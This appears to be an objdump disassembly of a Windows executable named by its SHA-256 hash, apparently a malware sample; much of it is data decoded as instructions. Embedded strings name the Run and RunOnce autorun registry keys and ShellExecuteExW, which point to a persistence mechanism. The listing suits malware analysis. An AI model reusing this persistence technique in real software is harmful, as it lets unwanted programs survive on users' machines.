
3a001b8c4d0e52362bba32d326158c4fbdbf48cefd49e5b1ac23d77bca98093f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    BYTE PTR [ecx+0x40],ah
  401007:	add    BYTE PTR [eax+0x21],dh
  40100a:	inc    eax
	...
  401013:	add    BYTE PTR [eax+0x60],al
  401016:	inc    eax
  401017:	add    BYTE PTR [eax+0x65],dl
  40101a:	inc    eax
  40101b:	add    BYTE PTR [eax],al
  40101d:	add    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax+0x21],dh
  401022:	add    BYTE PTR [eax],al
  401024:	xor    BYTE PTR ds:0x2a100000,ah
  40102a:	add    BYTE PTR [eax],al
  40102c:	loopne 0x40105d
  40102e:	add    BYTE PTR [eax],al
  401030:	shl    BYTE PTR [edi],0x0
  401033:	add    BYTE PTR [eax+0x38],ah
  401036:	add    BYTE PTR [eax],al
  401038:	jo     0x401083
  40103a:	add    BYTE PTR [eax],al
  40103c:	jo     0x40108c
  40103e:	add    BYTE PTR [eax],al
  401040:	nop
  401041:	dec    esi
  401042:	add    BYTE PTR [eax],al
  401044:	lock dec esi
  401046:	add    BYTE PTR [eax],al
  401048:	push   eax
  401049:	dec    edi
  40104a:	add    BYTE PTR [eax],al
  40104c:	jo     0x40109d
  40104e:	add    BYTE PTR [eax],al
  401050:	inc    eax
  401051:	push   eax
  401052:	add    BYTE PTR [eax],al
  401054:	lock push eax
  401056:	add    BYTE PTR [eax],al
  401058:	and    BYTE PTR [ecx+0x0],dl
  40105b:	add    al,dl
  40105d:	push   esp
  40105e:	add    BYTE PTR [eax],al
  401060:	loopne 0x4010b6
  401062:	add    BYTE PTR [eax],al
  401064:	lock push esp
  401066:	add    BYTE PTR [eax],al
  401068:	add    BYTE PTR [ebp+0x0],dl
  40106b:	add    BYTE PTR [eax],dl
  40106d:	push   ebp
  40106e:	add    BYTE PTR [eax],al
  401070:	and    BYTE PTR [ebp+0x0],dl
  401073:	add    BYTE PTR [eax],dh
  401075:	push   ebp
  401076:	add    BYTE PTR [eax],al
  401078:	rcl    BYTE PTR [esi+0x0],0x0
  40107c:	rcr    BYTE PTR [eax+0x0],0x0
  401080:	and    BYTE PTR [ecx+0x0],bl
  401083:	add    al,dh
  401085:	pop    ecx
  401086:	add    BYTE PTR [eax],al
  401088:	xor    BYTE PTR [ebx+0x0],bl
  40108b:	add    BYTE PTR [eax+0x5b],ah
  40108e:	add    BYTE PTR [eax],al
  401090:	add    BYTE PTR [eax+eax*1+0x0],bl
  401094:	adc    BYTE PTR [eax+eax*1+0x0],bl
  401098:	and    BYTE PTR [eax+eax*1+0x0],bl
  40109c:	xor    BYTE PTR [eax+eax*1+0x0],bl
  4010a0:	inc    eax
  4010a1:	pop    esp
  4010a2:	add    BYTE PTR [eax],al
  4010a4:	push   eax
  4010a5:	pop    esp
  4010a6:	add    BYTE PTR [eax],al
  4010a8:	jo     0x401106
  4010aa:	add    BYTE PTR [eax],al
  4010ac:	pusha  
  4010ad:	pop    ebp
  4010ae:	add    BYTE PTR [eax],al
  4010b0:	mov    al,0x5d
  4010b2:	add    BYTE PTR [eax],al
  4010b4:	inc    eax
  4010b5:	pusha  
  4010b6:	add    BYTE PTR [eax],al
  4010b8:	adc    BYTE PTR [ecx+0x0],ah
  4010bb:	add    BYTE PTR [eax-0x5fffff9d],dl
  4010c1:	arpl   WORD PTR [eax],ax
  4010c3:	add    BYTE PTR [eax],al
  4010c5:	add    BYTE PTR gs:[eax],al
  4010c8:	push   eax
  4010c9:	add    BYTE PTR gs:[eax],al
  4010cc:	xor    BYTE PTR [esi+0x0],ah
  4010cf:	add    al,al
  4010d1:	push   0x68f00000
  4010d6:	add    BYTE PTR [eax],al
  4010d8:	shr    BYTE PTR [ecx+0x0],0x0
  4010dc:	add    BYTE PTR [eax],al
  4010de:	add    BYTE PTR [eax],al
  4010e0:	mov    al,ds:0xf0004071
  4010e5:	jno    0x401127
  4010e7:	add    bl,ch
  4010e9:	and    eax,0x1041200
  4010ee:	jmp    0x401115
  4010f0:	add    BYTE PTR [eax],al
  4010f2:	add    DWORD PTR [eax+eax*1],eax
  4010f5:	and    BYTE PTR [eax],al
  4010f7:	and    al,ch
  4010f9:	and    eax,0x2041200
  4010fe:	out    0x25,eax
  401100:	add    BYTE PTR [eax],al
  401102:	add    DWORD PTR [eax+eax*1],eax
  401105:	and    BYTE PTR [eax],al
  401107:	and    cl,ch
  401109:	and    eax,0x1041200
  40110e:	jmp    0x1401138
  401113:	add    al,0x0
  401115:	and    BYTE PTR [eax],al
  401117:	and    dl,ch
  401119:	and    eax,0x2041200
  40111e:	jmp    0x1401148
  401123:	add    al,0x0
  401125:	and    BYTE PTR [eax],al
  401127:	and    ah,ch
  401129:	and    eax,0x2041200
  40112e:	jmp    0x401155
  401130:	add    BYTE PTR [eax],al
  401132:	add    DWORD PTR [eax+eax*1],eax
  401135:	and    BYTE PTR [eax],al
  401137:	and    dh,ch
  401139:	and    eax,0x2041000
  40113e:	in     eax,dx
  40113f:	and    eax,0x4010000
  401144:	add    BYTE PTR [eax],al
  401146:	add    BYTE PTR [eax+0x100025ed],al
  40114c:	add    al,0x1
  40114e:	in     eax,dx
  40114f:	and    eax,0x4010000
  401154:	add    BYTE PTR [eax],al
  401156:	add    BYTE PTR [eax+0x100025b3],al
  40115c:	add    al,0x2
  40115e:	mov    dl,0x25
  401160:	add    BYTE PTR [eax],al
  401162:	add    DWORD PTR [eax+eax*1],eax
  401165:	add    BYTE PTR [eax],al
  401167:	and    bh,0x25
  40116a:	add    BYTE PTR [edx],dl
  40116c:	add    al,0x1
  40116e:	out    0x25,eax
  401170:	add    BYTE PTR [eax],al
  401172:	add    DWORD PTR [eax+eax*1],eax
  401175:	and    BYTE PTR [eax],al
  401177:	and    ah,dl
  401179:	outs   dx,BYTE PTR ds:[esi]
  40117a:	xor    esi,DWORD PTR [eax]
  40117c:	daa    
  40117d:	jecxz  0x4011fb
  40117f:	inc    esp
  401180:	popf   
  401181:	loopne 0x4011d4
  401183:	mov    dh,0x52
  401185:	enter  0x861,0xf5
  401189:	and    eax,0x41000
  40118e:	cmc    
  40118f:	and    eax,0x4010000
  401194:	add    BYTE PTR [eax],al
  401196:	or     BYTE PTR [eax+0x100025f1],al
  40119c:	add    al,0x0
  40119e:	icebp  
  40119f:	and    eax,0x4010000
  4011a4:	add    BYTE PTR [eax],al
  4011a6:	or     BYTE PTR [eax+0x100025b2],al
  4011ac:	add    al,0x1
  4011ae:	mov    dl,0x25
  4011b0:	add    BYTE PTR [eax],al
  4011b2:	add    DWORD PTR [eax+eax*1],eax
  4011b5:	add    BYTE PTR [eax],al
  4011b7:	add    BYTE PTR [esp+eax*1],0x4
  4011bb:	add    al,0x4
  4011bd:	add    eax,0x2040402
  4011c2:	add    al,0x4
  4011c4:	add    al,0x4
  4011c6:	add    al,0x4
  4011c8:	add    al,0x4
  4011ca:	add    al,0x4
  4011cc:	add    al,0x4
  4011ce:	add    al,0x4
  4011d0:	add    al,0x4
  4011d2:	add    al,0x4
  4011d4:	add    al,0x3
  4011d6:	add    al,0x4
  4011d8:	add    al,BYTE PTR [eax+eax*1]
  4011db:	add    BYTE PTR [eax],al
  4011dd:	add    BYTE PTR [eax],al
  4011df:	add    ah,dh
  4011e1:	and    eax,0x41000
  4011e6:	hlt    
  4011e7:	and    eax,0x4010000
  4011ec:	add    BYTE PTR [eax],al
  4011ee:	or     BYTE PTR [eax+0x10000],al
  4011f4:	add    BYTE PTR [eax],al
  4011f6:	add    BYTE PTR [eax+0x0],al
  4011fc:	add    BYTE PTR [eax],al
  4011fe:	or     BYTE PTR [eax+0x10000],al
  401204:	add    DWORD PTR [eax],eax
  401206:	add    BYTE PTR [eax+0x20000000],al
  40120c:	add    BYTE PTR [eax],al
  40120e:	add    BYTE PTR [eax+0x40000000],al
  401214:	add    BYTE PTR [eax],al
  401216:	add    BYTE PTR [eax+0x40000000],al
  40121c:	add    BYTE PTR [eax],al
  40121e:	add    BYTE PTR [eax+0x10000],al
  401224:	add    BYTE PTR [eax],al
  401226:	add    BYTE PTR [eax],ah
  401228:	add    BYTE PTR [eax],al
  40122a:	add    DWORD PTR [eax],eax
  40122c:	add    BYTE PTR [eax],al
  40122e:	or     BYTE PTR [eax+0x2010000],al
  401234:	add    BYTE PTR [eax],al
  401236:	add    BYTE PTR [eax+0x10000],al
  40123c:	add    BYTE PTR [eax],al
  40123e:	add    BYTE PTR [eax+0x10000],al
  401244:	add    BYTE PTR [eax],al
  401246:	add    DWORD PTR [eax+0x10000],eax
  40124c:	add    DWORD PTR [eax],eax
  40124e:	or     BYTE PTR [eax+0x2010000],al
  401254:	add    BYTE PTR [eax],al
  401256:	add    DWORD PTR [eax+0x4010000],eax
  40125c:	add    BYTE PTR [eax],al
  40125e:	add    BYTE PTR [eax+0x4010000],al
  401264:	add    BYTE PTR [eax],ah
  401266:	add    BYTE PTR [eax],ah
  401268:	add    BYTE PTR [eax],al
  40126a:	add    DWORD PTR [eax+eax*1],eax
  40126d:	add    BYTE PTR [eax],cl
  40126f:	add    BYTE PTR [eax],0x0
  401272:	or     BYTE PTR [eax],al
  401274:	add    BYTE PTR [eax],al
  401276:	add    BYTE PTR [eax+0x20000],al
  40127c:	add    BYTE PTR [eax],al
  40127e:	add    BYTE PTR [eax+0x10000000],al
  401284:	add    BYTE PTR [eax],al
  401286:	add    BYTE PTR [eax+0x800000],al
  40128c:	add    BYTE PTR [eax],al
  40128e:	add    BYTE PTR [eax+0x0],al
  401294:	add    BYTE PTR [eax],al
  401296:	add    BYTE PTR [eax+0x100000],al
  40129c:	add    BYTE PTR [eax],al
  40129e:	add    BYTE PTR [eax+0x1000000],al
  4012a4:	add    BYTE PTR [eax],al
  4012a6:	add    BYTE PTR [eax+0x40000],al
  4012ac:	add    BYTE PTR [eax],al
  4012ae:	add    BYTE PTR [eax+0x10000],al
  4012b4:	add    BYTE PTR [eax],al
  4012b6:	add    BYTE PTR [eax],ah
  4012b8:	add    BYTE PTR [eax],al
  4012ba:	inc    eax
  4012bb:	add    BYTE PTR [eax],al
  4012bd:	add    BYTE PTR [eax],al
  4012bf:	add    BYTE PTR [eax],0x0
  4012c2:	and    BYTE PTR [eax],al
  4012c4:	add    BYTE PTR [eax],al
  4012c6:	add    BYTE PTR [eax+0x8000000],al
  4012cc:	add    BYTE PTR [eax],al
  4012ce:	add    BYTE PTR [eax-0x7fff0000],al
  4012d4:	add    BYTE PTR [eax],ah
  4012d6:	add    BYTE PTR [eax+0x10000],al
  4012dc:	add    BYTE PTR [eax],al
  4012de:	add    BYTE PTR [eax+0x2000000],al
  4012e4:	add    BYTE PTR [eax],al
  4012e6:	add    BYTE PTR [eax+0x0],al
  4012e9:	add    BYTE PTR [eax],al
  4012eb:	add    BYTE PTR [edx],al
  4012ed:	add    BYTE PTR [ecx],al
  4012ef:	and    BYTE PTR [eax],al
  4012f1:	add    BYTE PTR [eax],al
  4012f3:	add    BYTE PTR [eax],al
  4012f5:	add    BYTE PTR [eax],al
  4012f7:	add    BYTE PTR [eax],0x0
  4012fa:	add    DWORD PTR [eax],eax
  4012fc:	add    al,0x0
  4012fe:	add    BYTE PTR [eax+0x405530],al
  401304:	adc    BYTE PTR [ebp+0x40],dl
  401307:	add    al,ah
  401309:	push   esp
  40130a:	inc    eax
  40130b:	add    BYTE PTR [eax+0x4e],dh
  40130e:	inc    eax
  40130f:	add    BYTE PTR [eax-0xfffbfb2],dl
  401315:	push   esp
  401316:	inc    eax
  401317:	add    BYTE PTR [eax],ah
  401319:	push   ebp
  40131a:	inc    eax
  40131b:	add    BYTE PTR [eax],al
  40131d:	push   ebp
  40131e:	inc    eax
  40131f:	add    al,dl
  401321:	push   esp
  401322:	inc    eax
  401323:	add    BYTE PTR [eax+0x50],al
  401326:	inc    eax
  401327:	add    al,dh
  401329:	push   eax
  40132a:	inc    eax
  40132b:	add    BYTE PTR [eax+0x4f],dl
  40132e:	inc    eax
  40132f:	add    BYTE PTR [eax+0x4f],dh
  401332:	inc    eax
  401333:	add    BYTE PTR [eax],ah
  401335:	push   ecx
  401336:	inc    eax
  401337:	add    al,al
  401339:	imul   eax,DWORD PTR [eax+0x0],0x4069c0
  401340:	shr    BYTE PTR [ecx+0x40],0x0
  401344:	jo     0x401394
  401346:	inc    eax
  401347:	add    BYTE PTR [eax-0xfffbfb2],dl
  40134d:	dec    esi
  40134e:	inc    eax
  40134f:	add    BYTE PTR [eax],dh
  401351:	pop    esp
  401352:	inc    eax
  401353:	add    BYTE PTR [eax],dl
  401355:	push   ebp
  401356:	inc    eax
  401357:	add    BYTE PTR [eax],dl
  401359:	pop    esp
  40135a:	inc    eax
  40135b:	add    BYTE PTR [eax+0x4e],dh
  40135e:	inc    eax
  40135f:	add    BYTE PTR [eax+0x404e],dl
  401365:	pop    esp
  401366:	inc    eax
  401367:	add    BYTE PTR [eax],ah
  401369:	pop    esp
  40136a:	inc    eax
  40136b:	add    BYTE PTR [eax],al
  40136d:	push   ebp
  40136e:	inc    eax
  40136f:	add    BYTE PTR [eax+0x5c],al
  401372:	inc    eax
  401373:	add    al,al
  401375:	pop    eax
  401376:	inc    eax
  401377:	add    BYTE PTR [eax],ah
  401379:	pop    ecx
  40137a:	inc    eax
  40137b:	add    al,dh
  40137d:	pop    ecx
  40137e:	inc    eax
  40137f:	add    BYTE PTR [eax],dh
  401381:	pop    ebx
  401382:	inc    eax
  401383:	add    BYTE PTR [eax+0x4f],dl
  401386:	inc    eax
  401387:	add    al,al
  401389:	push   esi
  40138a:	inc    eax
  40138b:	add    BYTE PTR [eax+0x5b],ah
  40138e:	inc    eax
  40138f:	add    BYTE PTR [eax+eax*1+0x53],bl
  401393:	add    BYTE PTR [ebp+0x0],ah
  401396:	je     0x401398
  401398:	jne    0x40139a
  40139a:	jo     0x40139c
  40139c:	add    BYTE PTR [eax],al
  40139e:	add    BYTE PTR [eax],al
  4013a0:	push   ebx
  4013a1:	add    BYTE PTR [ebp+0x0],ah
  4013a4:	je     0x4013a6
  4013a6:	jne    0x4013a8
  4013a8:	jo     0x4013aa
  4013aa:	inc    esi
  4013ab:	add    BYTE PTR [eax+eax*1+0x61],ch
  4013af:	add    BYTE PTR [edi+0x0],ah
  4013b2:	jae    0x4013b4
  4013b4:	add    BYTE PTR [eax],al
  4013b6:	add    BYTE PTR [eax],al
  4013b8:	dec    ebp
  4013b9:	add    BYTE PTR [ebx+0x0],dl
  4013bc:	inc    edx
  4013bd:	add    BYTE PTR [ecx+0x0],al
  4013c0:	push   esp
  4013c1:	add    BYTE PTR [ebx+0x0],al
  4013c4:	dec    eax
  4013c5:	add    BYTE PTR [esi],ch
  4013c7:	add    BYTE PTR [ecx+0x0],cl
  4013ca:	dec    esi
  4013cb:	add    BYTE PTR [esi+0x0],al
  4013ce:	add    BYTE PTR [eax],al
  4013d0:	dec    esi
  4013d1:	add    BYTE PTR [edi+0x0],ch
  4013d4:	push   eax
  4013d5:	add    BYTE PTR [edx+0x0],dh
  4013d8:	outs   dx,DWORD PTR ds:[esi]
  4013d9:	add    BYTE PTR [ebp+0x0],ch
  4013dc:	jo     0x4013de
  4013de:	je     0x4013e0
  4013e0:	xor    al,BYTE PTR [eax]
  4013e2:	inc    edx
  4013e3:	add    BYTE PTR [edi+0x0],ch
  4013e6:	outs   dx,DWORD PTR ds:[esi]
  4013e7:	add    BYTE PTR [eax+eax*1+0x0],dh
  4013eb:	add    BYTE PTR [ebx+0x0],dl
  4013ee:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  4013f3:	add    BYTE PTR [eax+0x0],dh
  4013f6:	add    BYTE PTR [eax],al
  4013f8:	push   edi
  4013f9:	add    BYTE PTR [ecx+0x0],ah
  4013fc:	jb     0x4013fe
  4013fe:	outs   dx,BYTE PTR ds:[esi]
  4013ff:	add    BYTE PTR [eax+eax*1+0x69],dl
  401403:	add    BYTE PTR [ebp+0x0],ch
  401406:	add    BYTE PTR gs:[ebx+0x0],al
  40140a:	push   0x6e006100
  40140f:	add    BYTE PTR [edi+0x0],ah
  401412:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  401417:	add    BYTE PTR [ecx+0x0],ch
  40141a:	add    BYTE PTR gs:[edx+0x0],dh
  40141e:	outs   dx,BYTE PTR ds:[esi]
  40141f:	add    BYTE PTR [edi+0x0],ch
  401422:	outs   dx,BYTE PTR ds:[esi]
  401423:	add    BYTE PTR [ebx+0x0],ah
  401426:	add    BYTE PTR gs:[esi],ch
  401429:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40142d:	add    BYTE PTR [eax+eax*1+0x0],ch
  401431:	add    BYTE PTR [eax],al
  401433:	add    BYTE PTR [edx+0x75],dl
  401436:	outs   dx,BYTE PTR ds:[esi]
  401437:	dec    edi
  401438:	outs   dx,BYTE PTR ds:[esi]
  401439:	arpl   WORD PTR [ebp+0x45],sp
  40143c:	js     0x40148e
  40143e:	jb     0x4014af
  401440:	arpl   WORD PTR [ebp+0x73],sp
  401443:	jae    0x401445
  401445:	add    BYTE PTR [eax],al
  401447:	add    BYTE PTR [edx+0x0],dl
  40144a:	jne    0x40144c
  40144c:	outs   dx,BYTE PTR ds:[esi]
  40144d:	add    BYTE PTR [edi+0x0],cl
  401450:	outs   dx,BYTE PTR ds:[esi]
  401451:	add    BYTE PTR [ebx+0x0],ah
  401454:	add    BYTE PTR gs:[esi],dh
  401457:	add    BYTE PTR [eax+eax*1],dh
  40145a:	xor    eax,DWORD PTR [eax]
  40145c:	xor    al,BYTE PTR [eax]
  40145e:	add    BYTE PTR [eax],al
  401460:	push   ebx
  401461:	add    BYTE PTR [edi+0x0],ch
  401464:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401469:	add    BYTE PTR [ecx+0x0],ah
  40146c:	jb     0x40146e
  40146e:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  401473:	add    BYTE PTR [ecx+0x0],ch
  401476:	arpl   WORD PTR [eax],ax
  401478:	jb     0x40147a
  40147a:	outs   dx,DWORD PTR ds:[esi]
  40147b:	add    BYTE PTR [ebx+0x0],dh
  40147e:	outs   dx,DWORD PTR ds:[esi]
  40147f:	add    BYTE PTR [esi+0x0],ah
  401482:	je     0x401484
  401484:	pop    esp
  401485:	add    BYTE PTR [edi+0x0],dl
  401488:	imul   eax,DWORD PTR [eax],0x64006e
  40148e:	outs   dx,DWORD PTR ds:[esi]
  40148f:	add    BYTE PTR [edi+0x0],dh
  401492:	jae    0x401494
  401494:	pop    esp
  401495:	add    BYTE PTR [ebx+0x0],al
  401498:	jne    0x40149a
  40149a:	jb     0x40149c
  40149c:	jb     0x40149e
  40149e:	add    BYTE PTR gs:[esi+0x0],ch
  4014a2:	je     0x4014a4
  4014a4:	push   esi
  4014a5:	add    BYTE PTR [ebp+0x0],ah
  4014a8:	jb     0x4014aa
  4014aa:	jae    0x4014ac
  4014ac:	imul   eax,DWORD PTR [eax],0x6e006f
  4014b2:	pop    esp
  4014b3:	add    BYTE PTR [edx+0x0],dl
  4014b6:	jne    0x4014b8
  4014b8:	outs   dx,BYTE PTR ds:[esi]
  4014b9:	add    BYTE PTR [edi+0x0],cl
  4014bc:	outs   dx,BYTE PTR ds:[esi]
  4014bd:	add    BYTE PTR [ebx+0x0],ah
  4014c0:	add    BYTE PTR gs:[eax],al
  4014c3:	add    BYTE PTR [edx+0x0],dl
  4014c6:	jne    0x4014c8
  4014c8:	outs   dx,BYTE PTR ds:[esi]
  4014c9:	add    BYTE PTR [edi+0x0],cl
  4014cc:	outs   dx,BYTE PTR ds:[esi]
  4014cd:	add    BYTE PTR [ebx+0x0],ah
  4014d0:	add    BYTE PTR gs:[ebp+0x0],al
  4014d4:	js     0x4014d6
  4014d6:	add    BYTE PTR ss:[eax+eax*1],dh
  4014da:	xor    eax,DWORD PTR [eax]
  4014dc:	xor    al,BYTE PTR [eax]
  4014de:	add    BYTE PTR [eax],al
  4014e0:	push   edx
  4014e1:	add    BYTE PTR [ebp+0x0],dh
  4014e4:	outs   dx,BYTE PTR ds:[esi]
  4014e5:	add    BYTE PTR [esi],dh
  4014e7:	add    BYTE PTR [eax+eax*1],dh
  4014ea:	xor    eax,DWORD PTR [eax]
  4014ec:	xor    al,BYTE PTR [eax]
  4014ee:	add    BYTE PTR [eax],al
  4014f0:	inc    ecx
  4014f1:	add    BYTE PTR [eax+eax*1+0x74],ch
  4014f5:	add    BYTE PTR [ebp+0x0],ah
  4014f8:	jb     0x4014fa
  4014fa:	outs   dx,BYTE PTR ds:[esi]
  4014fb:	add    BYTE PTR [ecx+0x0],ah
  4014fe:	je     0x401500
  401500:	add    BYTE PTR gs:[ebx+0x0],dl
  401504:	push   0x6c006500
  401509:	add    BYTE PTR [eax+eax*1+0x53],ch
  40150d:	add    BYTE PTR [eax+eax*1+0x61],dh
  401511:	add    BYTE PTR [edx+0x0],dh
  401514:	je     0x401516
  401516:	jne    0x401518
  401518:	jo     0x40151a
  40151a:	add    BYTE PTR [eax],al
  40151c:	inc    ebp
  40151d:	add    BYTE PTR [eax+0x0],bh
  401520:	jo     0x401522
  401522:	ins    BYTE PTR es:[edi],dx
  401523:	add    BYTE PTR [edi+0x0],ch
  401526:	jb     0x401528
  401528:	add    BYTE PTR gs:[edx+0x0],dh
  40152c:	add    BYTE PTR [eax],al
  40152e:	add    BYTE PTR [eax],al
  401530:	inc    ebp
  401531:	add    BYTE PTR [eax+0x0],bh
  401534:	jo     0x401536
  401536:	ins    BYTE PTR es:[edi],dx
  401537:	add    BYTE PTR [edi+0x0],ch
  40153a:	jb     0x40153c
  40153c:	add    BYTE PTR gs:[edx+0x0],dh
  401540:	push   ebx
  401541:	add    BYTE PTR [eax+eax*1+0x61],dh
  401545:	add    BYTE PTR [edx+0x0],dh
  401548:	je     0x40154a
  40154a:	jne    0x40154c
  40154c:	jo     0x40154e
  40154e:	dec    esp
  40154f:	add    BYTE PTR [edi+0x0],ch
  401552:	add    BYTE PTR [bx+0x0],bl
  401556:	push   edx
  401557:	add    BYTE PTR [ebp+0x0],dh
  40155a:	outs   dx,BYTE PTR ds:[esi]
  40155b:	add    BYTE PTR [edi+0x0],cl
  40155e:	outs   dx,BYTE PTR ds:[esi]
  40155f:	add    BYTE PTR [ebx+0x0],ah
  401562:	add    BYTE PTR gs:[eax],al
  401565:	add    BYTE PTR [eax],al
  401567:	add    BYTE PTR [esi],dl
  401569:	add    BYTE PTR [eax],al
  40156b:	adc    eax,DWORD PTR [eax]
  40156d:	add    DWORD PTR [edx],ebx
  40156f:	jae    0x4015c1
  401571:	dec    edi
  401572:	iret   
  401573:	mov    DWORD PTR [edx-0x231f4cb9],eax
  401579:	call   0xbab61a47
  40157e:	add    BYTE PTR [eax],al
  401580:	inc    esi
  401581:	add    BYTE PTR [ecx+0x0],ch
  401584:	jb     0x401586
  401586:	jae    0x401588
  401588:	je     0x40158a
  40158a:	push   edx
  40158b:	add    BYTE PTR [ebp+0x0],ah
  40158e:	jno    0x401590
  401590:	jne    0x401592
  401592:	imul   eax,DWORD PTR [eax],0x650072
  401598:	jae    0x40159a
  40159a:	push   ebp
  40159b:	add    BYTE PTR [ebx+0x0],dh
  40159e:	add    BYTE PTR gs:[edx+0x0],dh
  4015a2:	dec    ecx
  4015a3:	add    BYTE PTR [esi+0x0],ch
  4015a6:	jo     0x4015a8
  4015a8:	jne    0x4015aa
  4015aa:	je     0x4015ac
  4015ac:	add    BYTE PTR [eax],al
  4015ae:	add    BYTE PTR [eax],al
  4015b0:	push   ebx
  4015b1:	add    BYTE PTR [edi+0x0],ch
  4015b4:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  4015b9:	add    BYTE PTR [ecx+0x0],ah
  4015bc:	jb     0x4015be
  4015be:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4015c3:	add    BYTE PTR [ecx+0x0],ch
  4015c6:	arpl   WORD PTR [eax],ax
  4015c8:	jb     0x4015ca
  4015ca:	outs   dx,DWORD PTR ds:[esi]
  4015cb:	add    BYTE PTR [ebx+0x0],dh
  4015ce:	outs   dx,DWORD PTR ds:[esi]
  4015cf:	add    BYTE PTR [esi+0x0],ah
  4015d2:	je     0x4015d4
  4015d4:	pop    esp
  4015d5:	add    BYTE PTR [edi+0x0],dl
  4015d8:	imul   eax,DWORD PTR [eax],0x64006e
  4015de:	outs   dx,DWORD PTR ds:[esi]
  4015df:	add    BYTE PTR [edi+0x0],dh
  4015e2:	jae    0x4015e4
  4015e4:	pop    esp
  4015e5:	add    BYTE PTR [ebx+0x0],al
  4015e8:	jne    0x4015ea
  4015ea:	jb     0x4015ec
  4015ec:	jb     0x4015ee
  4015ee:	add    BYTE PTR gs:[esi+0x0],ch
  4015f2:	je     0x4015f4
  4015f4:	push   esi
  4015f5:	add    BYTE PTR [ebp+0x0],ah
  4015f8:	jb     0x4015fa
  4015fa:	jae    0x4015fc
  4015fc:	imul   eax,DWORD PTR [eax],0x6e006f
  401602:	pop    esp
  401603:	add    BYTE PTR [edi+0x0],cl
  401606:	dec    edi
  401607:	add    BYTE PTR [edx+0x0],al
  40160a:	inc    ebp
  40160b:	add    BYTE PTR [eax],al
  40160d:	add    BYTE PTR [eax],al
  40160f:	add    BYTE PTR [ebx+0x0],dl
  401612:	push   0x6c006500
  401617:	add    BYTE PTR [eax+eax*1+0x44],ch
  40161b:	add    BYTE PTR [ebp+0x0],ah
  40161e:	jae    0x401620
  401620:	imul   eax,DWORD PTR [eax],0x74
  401623:	add    BYTE PTR [edi+0x0],ch
  401626:	jo     0x401628
  401628:	push   ebx
  401629:	add    BYTE PTR [edi+0x0],dh
  40162c:	imul   eax,DWORD PTR [eax],0x630074
  401632:	push   0x76004500
  401637:	add    BYTE PTR [ebp+0x0],ah
  40163a:	outs   dx,BYTE PTR ds:[esi]
  40163b:	add    BYTE PTR [eax+eax*1+0x0],dh
  40163f:	add    BYTE PTR [esi+0x0],cl
  401642:	push   ebp
  401643:	add    BYTE PTR [eax+eax*1+0x4c],cl
  401647:	add    BYTE PTR [eax],al
  401649:	add    BYTE PTR [eax],al
  40164b:	add    BYTE PTR [eax+0x58087471],ch
  401651:	add    BYTE PTR [ecx],ah
  401653:	inc    ebx
  401654:	popf   
  401655:	rol    DWORD PTR [edx+0x3f52cf89],cl
  40165b:	adc    DWORD PTR [eax+eax*1+0x53],0x70004100
  401663:	add    BYTE PTR [eax+0x0],dh
  401666:	inc    ebx
  401667:	add    BYTE PTR [ebp+0x0],cl
  40166a:	push   eax
  40166b:	add    BYTE PTR [esi],ch
  40166d:	add    BYTE PTR [eax+eax*1+0x4c],al
  401671:	add    BYTE PTR [eax+eax*1+0x0],cl
  401675:	add    BYTE PTR [eax],al
  401677:	add    BYTE PTR [edi+0x65],al
  40167a:	je     0x4016d0
  40167c:	gs jb  0x4016ec
  40167f:	jae    0x4016f3
  401681:	inc    ebx
  401682:	outs   dx,DWORD PTR ds:[esi]
  401683:	ins    DWORD PTR es:[edi],dx
  401684:	jo     0x4016e7
  401686:	je     0x4016ce
  401688:	ins    BYTE PTR es:[edi],dx
  401689:	popa   
  40168a:	addr16 jae 0x4016d2
  40168d:	js     0x40168f
  40168f:	add    BYTE PTR [edx+0x0],dl
  401692:	jne    0x401694
  401694:	outs   dx,BYTE PTR ds:[esi]
  401695:	add    BYTE PTR [eax+eax*1+0x4c],al
  401699:	add    BYTE PTR [eax+eax*1+0x33],cl
  40169d:	add    BYTE PTR [edx],dh
  40169f:	add    BYTE PTR [esi],ch
  4016a1:	add    BYTE PTR [ebp+0x0],al
  4016a4:	pop    eax
  4016a5:	add    BYTE PTR [ebp+0x0],al
	...
  4016b0:	push   edx
  4016b1:	add    BYTE PTR [ebp+0x0],dh
  4016b4:	outs   dx,BYTE PTR ds:[esi]
  4016b5:	add    BYTE PTR [eax+eax*1+0x4c],al
  4016b9:	add    BYTE PTR [eax+eax*1+0x33],cl
  4016bd:	add    BYTE PTR [edx],dh
  4016bf:	add    BYTE PTR [esi],ch
  4016c1:	add    BYTE PTR [ebp+0x0],al
  4016c4:	pop    eax
  4016c5:	add    BYTE PTR [ebp+0x0],al
  4016c8:	and    BYTE PTR [eax],al
  4016ca:	push   ebx
  4016cb:	add    BYTE PTR [eax+0x0],ch
  4016ce:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  4016d3:	add    BYTE PTR [ebx],dh
  4016d5:	add    BYTE PTR [edx],dh
  4016d7:	add    BYTE PTR [esi],ch
  4016d9:	add    BYTE PTR [eax+eax*1+0x4c],al
  4016dd:	add    BYTE PTR [eax+eax*1+0x2c],cl
  4016e1:	add    BYTE PTR [ebx+0x0],dl
  4016e4:	push   0x6c006500
  4016e9:	add    BYTE PTR [eax+eax*1+0x45],ch
  4016ed:	add    BYTE PTR [eax+0x0],bh
  4016f0:	add    BYTE PTR gs:[ebx+0x0],ah
  4016f4:	pop    edi
  4016f5:	add    BYTE PTR [edx+0x0],dl
  4016f8:	jne    0x4016fa
  4016fa:	outs   dx,BYTE PTR ds:[esi]
  4016fb:	add    BYTE PTR [eax+eax*1+0x4c],al
  4016ff:	add    BYTE PTR [eax+eax*1+0x20],cl
  401703:	add    BYTE PTR [edi],bh
  401705:	add    BYTE PTR [eax],dh
  401707:	add    BYTE PTR [eax+0x0],bh
  40170a:	and    eax,0x3f005800
  40170f:	add    BYTE PTR ds:0x7300,ah
  401715:	add    BYTE PTR [eax],al
  401717:	add    BYTE PTR [eax],ch
  401719:	add    BYTE PTR [esi+0x0],ch
  40171c:	jne    0x40171e
  40171e:	ins    BYTE PTR es:[edi],dx
